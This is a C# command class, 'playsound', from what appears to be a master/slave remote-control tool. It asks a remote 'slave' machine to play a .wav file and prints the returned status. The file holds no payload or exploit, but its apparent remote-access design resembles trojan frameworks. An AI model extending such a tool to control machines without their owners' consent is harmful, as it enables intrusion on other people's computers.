using Master.AdvancedConsole;
using Master.Commands.Core;
using System.Collections.Generic;

namespace Master.Commands
{
    internal class PlaySound : IMasterCommand
    {
        public string name { get; } = "playsound";

        public string description { get; } = "Play a .wav audio file on the remote slave";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "?:[FileName.wav]"
        };

        public void Process(List<string> args)
        {
            var result = MasterCommandsManager.networkManager.ReadLine();

            switch (result)
            {
                case "InvalidFormat":
                    ColorTools.WriteCommandError("Wrong format, expected .wav file");
                    break;
                case "FileError":
                    ColorTools.WriteCommandError("File not found on the remote slave");
                    break;
                default:
                    ColorTools.WriteCommandSuccess("Playing sound");
                    break;
            }
        }
    }
}
